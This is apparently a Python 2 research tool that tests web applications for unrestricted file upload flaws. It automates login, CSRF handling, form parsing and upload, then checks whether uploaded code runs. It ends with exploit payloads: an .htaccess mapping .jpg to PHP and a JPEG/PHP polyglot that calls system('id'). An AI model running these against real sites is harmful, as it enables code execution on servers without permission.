import urllib
import hashlib
import datetime
import re
import urllib2
import cookielib
import Cookie
from bs4 import BeautifulSoup
import time, os
import random
import zlib
import gzip
import StringIO as StrIO

import itertools
import mimetools
import mimetypes
from cStringIO import StringIO

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
from selenium.common.exceptions import TimeoutException

Debug = False

HEADLESS_VERIFY=False
#HEADLESS_VERIFY=True

def ungzip(data,encode=None):
  if encode != None:
    if "deflate" in encode.lower():
      ret = zlib.decompress(data, 16+zlib.MAX_WBITS)
    elif "gzip" in encode.lower():
      tmp = StrIO.StringIO(data)
      ret = gzip.GzipFile(fileobj=tmp).read()
  else:
    ret = data
  return ret

class MultiPartForm(object):
  """Accumulate the data to be used when posting a form."""
  """Provided by Ahnmo @ KAIST WSPLAB"""

  def __init__(self):
    self.form_fields = []
    self.files = []
    self.boundary = mimetools.choose_boundary()
    return

  def get_content_type(self):
    return 'multipart/form-data; boundary=%s' % self.boundary

  def add_field(self, name, value):
    """Add a simple field to the form data."""
    self.form_fields.append((name, value))
    return

  def add_file(self, fieldname, filename, fileHandle, mimetype=None):
    """Add a file to be uploaded."""
    body = fileHandle
    if mimetype is None:
      mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
    self.files.append((fieldname, filename, mimetype, body))
    return

  def __str__(self):
    """Return a string representing the form data, including attached files."""
    # Build a list of lists, each containing "lines" of the
    # request.  Each part is separated by a boundary string.
    # Once the list is built, return a string where each
    # line is separated by '\r\n'.
    parts = []
    part_boundary = '--' + self.boundary

    # Add the form fields
    parts.extend(
      [ part_boundary,
        'Content-Disposition: form-data; name="%s"' % name,
        '',
        value,
      ]
      for name, value in self.form_fields
      )

    # Add the files to upload
    parts.extend(
      [ part_boundary,
        'Content-Disposition: file; name="%s"; filename="%s"' % \
         (field_name, filename),
        'Content-Type: %s' % content_type,
        '',
        body,
      ]
      for field_name, filename, content_type, body in self.files
      )

    # Flatten the list and add closing boundary marker,
    # then return CR+LF separated data
    flattened = list(itertools.chain(*parts))
    flattened.append('--' + self.boundary + '--')
    flattened.append('')
    return '\r\n'.join(flattened)

class headlessTester(object):
  __testable__ = ['chrome','firefox']
  def browserTest(self, url, cookie=None, getBrowser=False):
    ret={}
    browser = self.getFirefoxDriver()
    test = self.headlesstest(url,browser,cookie) #if code not executed, test is none
    browser.close()
    if test != None:  # code executed
      if not getBrowser:
        return [True, test]
      else:
        ret["firefox"] = [True, test]
    else:
      ret["firefox"] = [False, test]

    browser = self.getChromeDriver()
    test = self.headlesstest(url,browser,cookie)
    browser.close()
    if test != None:  # code executed
      if not getBrowser:
        return [True, test]
      else:
        ret["chrome"] = [True, test]
    else:
      ret["chrome"] = [False, test]

    res_code = None
    if getBrowser: # if it is true, it returns only code is executable in each browsers and result.
      return ret
    else:
      # if it is not,
      try:
        req = urllib2.Request(url)
        if Debug:
          print "[http request] full verification urlopen"
        res = urllib2.urlopen(req)
      except urllib2.HTTPError as e:
        res_code = e.code
        res = None

      if res_code == None and res != None:
        res_code = res.code
      if res_code == 403:
        return [False, "Forbidden"]

      if res_code == 500:
        return [True, None]
      elif res_code == 200 and res != None:
        return [False, res.read()]
      else:
        return [False, None]


  def getFirefoxDriver(self):
    profile = webdriver.FirefoxProfile()
    profile.set_preference("browser.download.folderList", 2)
    profile.set_preference("browser.download.manager.showWhenStarting", False)
    profile.set_preference("browser.download.dir", os.path.abspath('./tmp'))
    profile.set_preference("browser.helperApps.neverAsk.saveToDisk", "image/jpeg;image/gif;image/png;application/pdf;application/zip;application/gzip;text/plain")
    profile.set_preference("browser.helperApps.alwaysAsk.force", False)
    options = webdriver.FirefoxOptions()
    options.set_headless(True)
    browser = webdriver.Firefox(firefox_profile=profile,options=options)
    return browser

  def getChromeDriver(self):
    options = webdriver.ChromeOptions()
    options.add_argument('headless')
    prefs = {"download.default_directory" : os.path.abspath('./tmp')}
    options.add_experimental_option("prefs",prefs)
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument("download.default_directory={}".format(os.path.abspath('./tmp')))
    browser = webdriver.Chrome(chrome_options=options)
    return browser


  def headlesstest(self, url, browser, cookie=None):
    browser.set_page_load_timeout(1) # Load limit = 1sec
    try:
      browser.get(url)
    except:
      pass

    alert = None
    ret_data = None
    try:
      WebDriverWait(browser, 0.1).until(
        expected_conditions.alert_is_present()
      )
      alert = browser.switch_to.alert
    except TimeoutException:
      pass
    if alert!=None:
      ret_data = alert.text
      alert.accept()

    return ret_data


# 302 Request Catcher
class ResponseCatcher(urllib2.HTTPErrorProcessor):
  def http_response(self,request,response):
    return response
  https_response = http_response

# add Headers in request
def addHeader(req, host,referer=None,contenttype=None):
  req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36')
  req.add_header('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
  req.add_header('Origin', host)
  if referer != None:
    req.add_header('Referer',referer)
  if contenttype != None:
    req.add_header('Content-Type',contenttype)

def charEscaper(data,condition):
  if data == None:
    return ''
  data = list(data)
  for i in range(0,len(data)):
    if data[i] in condition:
      data[i] = '%{}#'.format(hex(ord(data[i]))[2:])
  return ''.join(data)

def charDescaper(data):
  ret = ""
  pass_counter = 0
  for i in range(0,len(data)):
    if pass_counter > 0:
      pass_counter -= 1
      continue
    if data[i] == '%' and (i+3 < len(data) and data[i+3] == '#'):
      ret += chr(int(data[i+1:i+3],16))
      pass_counter += 3
    else:
      ret += data[i]
  return ret


# cookie merge
def cookieMerger(origin,new):
  # escaping and descaping for evade Cookielib bug - array variable([])

  merger = Cookie.SimpleCookie()
  merger.load(charEscaper(origin,'[/]'))
  merger.load(charEscaper(new,'[/]'))

  for i in merger.keys():
    try:
      if merger[i].value[-1] == ',':
        merger[i] = merger[i].value[:-1]
    except:
      pass

  out = merger.output('',header='')
  out = out.split('\r\n')
  out = map(str.strip,out)
  out = charDescaper('; '.join(out))
  return out


def url_simplizer(baseurl, url):
  if baseurl[-1]=='/':
    base = baseurl[:-1]
  else:
    base = baseurl


  if 'http://' not in url:
    new_url = url.split("/")
    tmp_url = base
    while True:
      if ".." in new_url[0]:
        new_url = new_url[1:]
        tmp_url = tmp_url.rsplit('/',1)[0]
      elif "." == new_url[0]:
        new_url = new_url[1:]
      elif "" == new_url[0]:
        tmp_url = '/'.join(tmp_url.split("/",3)[:-1])
        new_url = new_url[1:]
      else:
        new_url = tmp_url+'/'+'/'.join(new_url)
        break
  else:
    new_url = url
  return new_url


# Try to Login
def tryLogin(target):
  CSRFName = None
  logined_page = None

  if target['webLoginCSRFName']:
    CSRFName = target['webLoginCSRFName']

  # Get basic cookies and CSRF Value if it is exist
  setCookie, CSRFValue = urlValidator(target,CSRFName)

  cookie_process = setCookie.split(',')
  setCookie=[]
  for i in cookie_process:
    setCookie.append(i.split(';',1)[0])
  setCookie = ';'.join(setCookie)

  # Set id, pw information
  data = {}
  data[target['webLoginIDName']]=target['id']
  data[target['webLoginPWName']]=target['pw']

  # Set CSRF Value if it is exist
  if CSRFValue != None and len(CSRFValue)>0 and CSRFValue[0]!='' and CSRFValue[0] != None:
    for i in CSRFValue:
      CSRFElement = i.split('=',1)
      data[CSRFElement[0]]=CSRFElement[1]

  # Set Additional Variable in POST Body
  additional = target['webLoginAdditionalValue'].split(';')
  if additional[0]!='':
    for i in additional:
     sp = i.split('=',1)
     data[sp[0]]=sp[1]

  # Build Request
  cookieJar = cookielib.CookieJar()
  loginOpener = urllib2.build_opener(ResponseCatcher, urllib2.HTTPCookieProcessor(cookieJar))
  req = urllib2.Request(target['webLoginURL'],urllib.urlencode(data))
  if 'webCSRFHeader' in target.keys() and target['webCSRFHeader'] != None:
    req.add_header(target['webCSRFHeader'][0],target['webCSRFHeader'][1])
  # if basic cookie exist, it is appended to request header
  if setCookie != '':
    req.add_header('Cookie',setCookie)

  # Add basic header
  addHeader(req,target['webHost'],referer=customTag(target,target["webLoginPageURL"]), contenttype='application/x-www-form-urlencoded')

  # try to login
  res = loginOpener.open(req)
  if 'set-cookie' in res.headers.keys():
    setCookie = cookieMerger(setCookie,res.headers['Set-Cookie'])

  # 302/303 processing
  if int(res.code) >= 300 and int(res.code) < 400:
    # Make Redirection Request using Location Header
    while res.code >= 300 and res.code < 400:
      if '/' not in res.headers['Location']:
        baseurl = target['webLoginPageURL'].rsplit('/',1)[0]
        red_req = urllib2.Request("{}/{}".format(baseurl,res.headers['Location']))
      elif 'http://' not in res.headers['Location']:
        # case for "Location : /relation/path"
        relocation_path = res.headers['Location']
        if relocation_path[0] == '/':
          relocation_path = relocation_path[1:]
        red_req = urllib2.Request("{}/{}".format(target['webHost'],relocation_path))

      else:
        # case for "Location : http://blah.blahblah.bl/relation/path"
        red_req = urllib2.Request(res.headers['Location'])

      logined_cookie = None

      # Merge given session cookie and append it to Redirection Request

     # append Basic header and Referer
      red_req.add_header('Referer',target['webLoginURL'])
      if setCookie != '':
        red_req.add_header('Cookie',setCookie)
      addHeader(red_req,target['webHost'])

      # Send Redirection Request
      res = loginOpener.open(red_req)
      if 'set-cookie' in res.headers.keys():
        setCookie = cookieMerger(setCookie,res.headers['Set-Cookie'])

    logined_page = res.read()
  # 200 Processing - do not need to another processing
  elif res.code == 200:
    # get session cookie
    if 'set-cookie' in res.headers.keys():
      setCookie = cookieMerger(setCookie,res.headers['Set-Cookie'])
    logined_page = res.read()
  # response code is not 200 or 302 | 303, this login try maybe failed
  else:
    print "[-] Can not Login.."
  # Verify Login using string
  if target["webLoginSuccessStr"] in logined_page:
    print "[+] Login Success"
    return setCookie

  else:
    print "[-] Login Fail"
    exit(0)



# if url is valid, it returns default cookies.
def urlValidator(target,CSRF=None):
  url = customTag(target,target["webLoginPageURL"])
  cookieJar = cookielib.CookieJar()
  loginOpener = urllib2.build_opener(ResponseCatcher, urllib2.HTTPCookieProcessor(cookieJar))

  req = urllib2.Request(url)
  addHeader(req,target["webHost"])
  res = loginOpener.open(req)
  cookie = ''

  # 200 response is valid for login url. Others maybe not useable
  while True:
    if res.code >=300 and res.code < 400:
      if 'set-cookie' in res.headers.keys():
        cookie = res.headers['set-cookie']
      if 'http://' not in res.headers['Location']:
        # case for "Location : /relation/path"

        print "*{}{}".format(target['webHost'],res.headers['Location'])
        red_req = urllib2.Request("{}{}".format(target['webHost'],res.headers['Location']))
      else:
        # case for "Location : http://blah.blahblah.bl/relation/path"
        red_req = urllib2.Request(res.headers['Location'])
      red_req.add_header('Cookie',cookie)
      addHeader(red_req,target['webHost'],target['webLoginPageURL'])
      if Debug:
        print "[http request] urlValidator urlopen"
      res = urllib2.urlopen(red_req)
      continue
    try:
      data = res.read()
    except:
      print "response read fail"
      exit(0)
    if res.code == 200 or len(data)>0:
      CSRFValue = None
      # if it has CSRF Token, get Token
      if CSRF!=None and CSRF != '':
        CSRFValue = getCSRFToken(res,data,CSRF,target)

      # if it has basic cookies, get cookie
      if 'set-cookie' in res.headers.keys():
        cookie = res.headers['set-cookie']

      # return both
      return cookie, CSRFValue

    else:
      # if url is not valid, return None
      return None, None

def getCSRFToken(res_obj, html,CSRFEles,target):
  CSRF_LIST = CSRFEles.split(';')
  ret = []
  target['webCSRFHeader'] = None
  for CSRF in CSRF_LIST:
    if "%cookietoken#" in CSRF:
      if 'set-cookie' in res_obj.headers.keys():
        setcookie_data = res_obj.headers['set-cookie']
      if 'webLoginCookie' in target.keys():
        target['webLoginCookie'] = cookieMerger(target['webLoginCookie'],setcookie_data)
      else:
        target['webLoginCookie'] = setcookie_data
    elif "%headertoken" in CSRF:
      header_name = CSRF.split(':',1)[1][:-1]
      header_name = header_name.split('@',1)
      if header_name[0] == 'html_tag': #%headertoken:html_metatag@taginfo=csrf-token=headername#
        soup = BeautifulSoup(html,'html.parser')
        findname = header_name[1].split('=')
        # findname [0] - tag [1] - attrname [2] - attrvalue [3] getAttrName [4] Header Name
        csrftoken = soup.find(findname[0],{findname[1]:re.compile(findname[2])})
        target['webCSRFHeader'] = [findname[4],csrftoken[findname[3]].encode('ascii')]

      elif header_name[0] == 'html_regex':
        findname = header_name[1].split('=')
        reg_obj = re.compile(findname[0])
        data = reg_obj.search(html)
        find_str = data.string[data.start():data.end()]
        reg_detail_obj = re.compile(findname[1])
        data = reg_detail_obj.search(find_str)
        csrftoken = data.string[data.start():data.end()]
        if data != None:
          target['webCSRFHeader'] = [findname[2],csrftoken]
        else:
          print "[-] CSRFToken was not found in upload page"
          exit(0)

      elif header_name[0] == 'header':
        if header_name[1] in res_obj.headers.keys():
          target['webCSRFHeader'] = [header_name,res_obj.headers[header_name[1]]]
        else:
          print "[-] Can't not found CSRF Token in Response Header"
          exit(0)
      else:
        print "[-] Weird CSRF Expression"
        exit(0)
    else:
      try:
        soup = BeautifulSoup(html,'html.parser')

        if "%reg" == CSRF[:4]:
          csrftoken = soup.find("input",{"name":re.compile(CSRF[5:-1])})

        else:
          csrftoken = soup.find("input",{"name":CSRF})

      except:
        ret.append(None)
        continue
      if csrftoken == None:
        ret.append(None)
        continue

      ret.append("{}={}".format(csrftoken['name'],csrftoken['value']))
  return ret

# upload form Parser to get upload processing url(action) and variables
# It use 'beautifulsoup4' library
def formParser(target):
  formAttr = target['webUploadFormAttr'].split(';')
  if len(formAttr[0]) == 0:
    return

  req = urllib2.Request(customTag(target,target['webUploadPageURL']))
  req.add_header('Cookie',target['webLoginCookie'])
  addHeader(req,target['webHost'])
  req.add_header('Accept-encoding', 'gzip,deflate')
  if Debug:
    print "[http request] formParser urlopen"
  res = urllib2.urlopen(req)
  if 'content-encoding' in res.headers.keys():
    cnt = res.headers['content-encoding']
  else:
    cnt = None
  body = ungzip(res.read(),cnt)
  soup = BeautifulSoup(body,'html.parser')
  attr = {}
  for i in formAttr:
    part = i.split('=',1)
    if len(part) != 2:
      part[1] = ''
    attr[part[0]] = part[1]
  if "enctype" not in attr.keys():
    attr["enctype"] = "multipart/form-data"
  form  =  soup.find("form",attr)
  input_cursor = form.findAll("input")
  param = []
  for i in  input_cursor:
    if not i.has_attr('name'):
      continue
    elif not i.has_attr('value'):
      i['value'] = ''
    if i['type']=="file":
      i['value'] = "%filebinary#"
    uniq = True
    for j in param:
      temp_param = j.split("=",1)
      if i['name'] == temp_param[0]:
        uniq = False # it makes multiple-valued parameter use first value.
        break
    if uniq:
      param.append("{}={}".format(i['name'],i['value']))
  if len(target['webUploadAdditionalValue'])!=0:
    checklist = target['webUploadAdditionalValue'].split(';')
    for check_params in checklist:
      checker_param = check_params.split('=',1)
      isexist_flag = False
      for i in range(0,len(param)):
       checked_param = param[i].split('=',1)
       if checker_param[0] == checked_param[0]:
         if checker_param[1]!='' and checker_param[1]=='%find#':
           param[i] = "{}={}".format(checker_param[0], checked_param[1])
         elif checker_param[1]!='' and checker_param[1]!='%find#':
           param[i] = "{}={}".format(checker_param[0], checker_param[1])
         isexist_flag = True
      if not isexist_flag and checked_param[1]!='%find#':
        param.append('{}={}'.format(checked_param[0], checked_param[1]))
      elif isexist_flag:
        pass
      else:
        print "  [!] Parameter {} isn't found from upload page".format(checker_param[0])
        param.append('{}='.format(checked_param[0]))

  if form['action'] == '':
    target['webUploadURL'] = target['webUploadPageURL']
  elif 'http:' not in form['action']:
    if '//' == form['action'][:2]:
      target['webUploadURL'] = 'http:'+form['action']
    elif '/' == form['action'][0]:
      target['webUploadURL'] = target['webHost'][:-1]+form['action']
    else:
      folder = target['webUploadPageURL'].rsplit("/",1)
      target['webUploadURL'] = folder[0]+'/'+form['action']
  else:
    target['webUploadURL'] = form['action']

  target['webUploadAdditionalValue'] = ';'.join(param)


def makeUploadRequest(target,uploadFile):
  req = {}
  form = MultiPartForm()

  # Append CSRF Token to Body
  if (target['webUploadCSRFName'] != ''):
    semi_req = urllib2.Request(customTag(target,target['webUploadPageURL']))
    addHeader(semi_req, target['webHost'])
    semi_req.add_header('Cookie',target['webLoginCookie'])
    semi_req.add_header('Accept-encoding', 'gzip,deflate')
    if Debug:
      print "[http request] makeUploadRequest urlopen(CSRF Append)"
    semi_res = urllib2.urlopen(semi_req)
    if 'content-encoding' in semi_res.headers.keys():
      cnt = semi_res.headers['content-encoding']
    else:
      cnt = None
    semi_data = ungzip(semi_res.read(),cnt)
    semi_CSRF = getCSRFToken(semi_res,semi_data,target['webUploadCSRFName'],target)
    if semi_CSRF != None and len(semi_CSRF) > 0 and semi_CSRF[0] != '' and semi_CSRF[0] != None:
      for i in semi_CSRF:
        part = i.split('=',1)
        form.add_field(part[0],part[1])
    if "%dom:" in target['webUploadURL']:
        arg = target['webUploadURL'].split(':',1)[1].split('@')
        regex_urlform = re.compile(arg[0])
        regex_urlform_match = re.compile(arg[1][:-1])
        semi_data = semi_data.replace('\\','')
        reg_urlform = regex_urlform.search(semi_data)
        return_url = ""
        if reg_urlform != None:
          condid_url = reg_urlform.string[reg_urlform.start():reg_urlform.end()]
          reg_urlform_match = regex_urlform_match.search(condid_url)
          if reg_urlform_match != None:
            return_url = reg_urlform_match.string[reg_urlform_match.start():reg_urlform_match.end()]
        target["webDynamicUploadURL"] = None
        if return_url != "":
          target["webDynamicUploadURL"] = return_url
        else:
          print "[-] Not Found Dynamic upload URL"
          exit(0)

  # Append other parameters to Body
  append_field = target['webUploadAdditionalValue'].split(";")
  for i in append_field:
    part=i.split("=",1)
    if len(part) < 2:
      part.append('')

    # if parameter value or name determined by file..
    if "%filename#" in part[1]:
      if uploadFile["fileext"] != None and len(uploadFile["fileext"]) > 0:
        form.add_field(part[0],uploadFile["filename"]+"."+uploadFile["fileext"])# file name
      else:
        form.add_field(part[0],uploadFile["filename"])
    elif "%filebinary#" in part[1]:
      if uploadFile["fileext"] != None and len(uploadFile["fileext"]) > 0:
        form.add_file(part[0],uploadFile["filename"]+"."+uploadFile["fileext"],fileHandle=uploadFile["content"],mimetype=uploadFile["filetype"])
      else:
        form.add_file(part[0],uploadFile["filename"],fileHandle=uploadFile["content"],mimetype=uploadFile["filetype"])
    elif "%cookie" in part[1] or "%domtoken" in part[1] or "%randint" in part[1]:
      form.add_field(part[0],customTag(target,part[1]))
    else:
      form.add_field(part[0],part[1])

  # preparing return data
  req['body'] = str(form)
  req['type'] = form.get_content_type()
  req['filename'] = uploadFile['filename']
  return req

def customTag(target, data):
  tagExist = False
  if '%' in data and '#' in data:
    tagExist = True
  while tagExist:
    startPoint = data.index('%')
    endPoint = data.index('#')
    while True:
      try:
        svSp = data.index('%',startPoint+1)
      except:
        break
      if svSp > endPoint:
        break
      else:
        startPoint = svSp
    custom = data[data.index('%')+1:data.index('#')]
    replaced_data = None
    custom = custom.split(':',1)
    if custom[0] == "rndint":
      replaced_data = random.randrange(1,100000)
    elif custom[0] == "cookie":
      cookieManager = Cookie.SimpleCookie()
      cookieManager.load(charEscaper(target['webLoginCookie'],'[/'))
      if "reg" in custom[1]:
        regex_ = re.compile(custom[1].split(':',1)[1])
        for i in cookieManager.keys():
          reg_result = regex_.findall(charDescaper(i))
          if len(reg_result)>0:
            replaced_data = cookieManager[i].value
            break
      else:
        for i in cookieManager.keys():
          if charDescaper(i) == custom[1]:
            replaced_data = cookieManager[i].value
            break
    elif custom[0] == "domtoken":
      arg = custom[1].rsplit('@',1)
      token_req = urllib2.Request(customTag(target,target['webUploadPageURL']))
      token_req.add_header('cookie',target['webLoginCookie'])
      token_req.add_header('Accept-encoding', 'gzip,deflate')
      addHeader(token_req,target['webHost'])
      if Debug:
        print "[http request] custom tag - domtoken urllib2"
      token_res_obj = urllib2.urlopen(token_req)
      if "content-encoding" in token_res_obj.headers.keys():
        cnt = token_res_obj.headers['content-encoding']
      else:
        cnt = None
      token_res = ungzip(token_res_obj.read(),cnt)
      regex_token = re.compile(arg[0])
      reg_result = regex_token.findall(token_res)
      regex_extract = re.compile(arg[1])
      for i in reg_result:
        tmp = regex_extract.findall(i)
        if len(tmp)>0:
          replaced_data = tmp[0]
          break
      if "%dom:" in target['webUploadURL']:
        arg = target['webUploadURL'].split(':',1)[1].split('@')
        regex_urlform = re.compile(arg[0])
        regex_urlform_match = re.compile(arg[1])
        token_res = token_res.replace('\\','')
        reg_urlform = regex_urlform.search(token_res)
        return_url = ""
        if reg_urlform != None:
          condid_url = reg_urlform.string[reg_urlform.start():reg_urlform.end()]
          reg_urlform_match = regex_urlform_match.search(condid_url)
          if reg_urlform_match != None:
            return_url = reg_urlform_match.string[reg_urlform_match.start():reg_urlform_match.end()]
        target["webDynamicUploadURL"] = None
        if return_url != "":
          target["webDynamicUploadURL"] = return_url
        else:
          print "[-] Not Found Dynamic upload URL"
          exit(0)


    if replaced_data == None:
      replaced_data = ''
    data = data.replace('%{}#'.format(':'.join(custom)),replaced_data)
    if '%' not in data or '#' not in data:
      tagExist=False
  return data

def uploadFile(target, upload_req):
  if "%dom:" in target['webUploadURL']:
    url = target["webDynamicUploadURL"]
  else:
    url = customTag(target,target['webUploadURL'])
  url = url_simplizer(target['webUploadPageURL'], url)
  try:
    req = urllib2.Request(url.encode('ascii'))
    req.add_header('Content-Type', upload_req['type'])
    req.add_header('Content-Length', len(upload_req['body']))
    req.add_header('Cookie',target['webLoginCookie'])
    req.add_data(upload_req['body'])
    addHeader(req, target['webHost'], referer=customTag(target,target['webUploadPageURL']))
    if target['webUploadCustomHeader'] != '':
      custom = target['webUploadCustomHeader'].split('=',1)
      if len(custom) >0:
        req.add_header(custom[0], custom[1])
      else:
        print "[-] Custom Header is wrong"
        exit(0)
    if 'webCSRFHeader' in target.keys() and target['webCSRFHeader'] != None:
      req.add_header(target['webCSRFHeader'][0],target['webCSRFHeader'][1])
    req.add_header('Accept-encoding', 'gzip,deflate')

    if Debug:
      print "[http request] uploadFile urlopen"
    res_obj = urllib2.urlopen(req)
  except urllib2.HTTPError as e:
    res_obj = e

  if res_obj.code >=300 and res_obj.code<400:
    redirect_url = res_obj.headers['Location']
    while True:
     rereq = urllib2.Request(redirect_url)
     rereq.add_header('Accept-encoding','gzip,deflate')
     rereq.add_header('Cookie',target['webLoginCookie'])
     addHeader(rereq, target['webHost'], referer=url)
     try:
       if Debug:
         print "[http request] upload File - 302 re-urlopen"
       res_obj = urllib2.urlopen(rereq)
     except urllib2.HTTPError as e:
       res_obj = e
     if not (res_obj.code >=300 and res_obj.code<400):
       break
  if "content-encoding" in res_obj.headers.keys():
    encode = res_obj.headers['content-encoding']
  else:
    encode = None
  res = ungzip(res_obj.read(),encode)
  if target['webUploadSuccessStr'][0] == '%' and target['webUploadSuccessStr'][-1] == '#':
    custom_tag = target['webUploadSuccessStr'][1:-1]
    if custom_tag == 'filename':
      checker = upload_req['filename']
    elif custom_tag[:5]=="code=":
      checker = int(custom_tag.split('=',1)[-1])
      res = int(res_obj.code)
    elif custom_tag[:6]=="notin=":
      checker = custom_tag[6:]
      if res!=None and checker not in res:
        return (True, res)
      else:
        return (False, res)
  else:
    checker = target['webUploadSuccessStr']
  if res != None and checker in res:
    return (True, res)
  else:
    return (False, res)

def accessValidation(target, url, content, resultString, seedType):
  if not  HEADLESS_VERIFY:
    try:
      req = urllib2.Request(url.encode('ascii'))
      req.add_header('Cookie',target['webLoginCookie'])
      addHeader(req, target['webHost'])
      if Debug:
        print "[http request] light-verification urlopen"
      res = urllib2.urlopen(req)
    except urllib2.HTTPError as e:
      res = e
    resCode = res.code
    resData = res.read()

    isSniffBan = False

    if resultString in resData:
      return [True, "Execution Succeed"]
    elif content in resData:
      if res != None and 'content-type' in res.headers.keys():
        cnt_type = res.headers['content-type']
        cnt_type = cnt_type.split(';',1)[0]
      else:
        cnt_type = None
      if "x-content-type-options" in res.headers.keys() and res.headers['x-content-type-options'] == "nosniff":
        print "[-] Content Sniffing Banned!"
        isSniffBan = True
      if (seedType=='html' or seedType=='xhtml') and (cnt_type == None and not isSniffBan) or (cnt_type != None and ("text/html" in cnt_type or "application/xhtml+xml" in cnt_type)):
        return [True, "Code Exposed"]# php, js - Potencial Code Execution, html - Code Execution
      elif (seedType == 'html' or seedType=='xhtml') and (cnt_type != None and ("image/svg+xml" in cnt_type or "message/rfc822" in cnt_type)):
        return [True, "Code Exposed"]
      elif (seedType == 'js') and ((not isSniffBan and (cnt_type == None or ("application/pdf" in cnt_type) or ("application/x-gzip" in cnt_type) or ("application/xhtml+xml" in cnt_type) or ("application/zip" in cnt_type) or ("text/html" in cnt_type) or ("text/plain" in cnt_type) or ("application/javascript" in cnt_type))) or (isSniffBan and cnt_type != None and "application/javascript" in cnt_type)): # cnt_type condition will be appended
        return [True, "Code Exposed"]
      elif (seedType == 'php'):
        return [True, "Code Exposed"]
      else:
        return [False, "Code Exposed"]
    elif resCode == 500:
      return [True, "Execution Succeed"] # code execution
    elif resCode == 403:
      return [False, "Forbidden"]
    else:
      return [False, "Fail"]

  else:
    tester = headlessTester()
    res = tester.browserTest(url,cookie=target['webLoginCookie'])
    uni2asc = lambda x : chr(ord(x))
    if res[1] != None:
      res[1] = ''.join(map(uni2asc,res[1]))

    if res[0]:
      if res[1] != None and res[1] == resultString:
        ret = [True, "Execution Succeed"]
      elif res[1] != None and resultString in res[1]:
        ret = [True, "Execution Succeed"]
      else:
        ret = [True, "Execution Succeed but something wrong"]
    elif res[1] == "Forbidden":
      ret = [False, "Forbidden"]
    elif content == res[1]:
      ret = [True, "Code Exposed"]
    else:
      ret = [False, "Fail"]
    return ret



def makeS1Data(m3_mut=""):
  # S1 - .htaccess try
  conttype = m3_mut
  if m3_mut == "":
    conttype = "text/plain"
  output = {
    'filename': ".htaccess",
    'fileext': "",
    'filetype': conttype,
    'content': "AddType application/x-httpd-php .jpg"
  }
  return output

def makeS1TestData():
  # S1 - test data
  output = {
    'filename': hashlib.md5(datetime.datetime.now().__str__()).hexdigest(),
    'fileext': "jpg",
    'filetype': "image/jpg",
    'content': """\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46<?php system('id');$sign=pack('H*',dechex((2534024256545858215*2)));print "<script>alert('".$sign."');</script>";?><!--{}-->""".format(os.urandom(8).encode('hex'))
  }
  return output


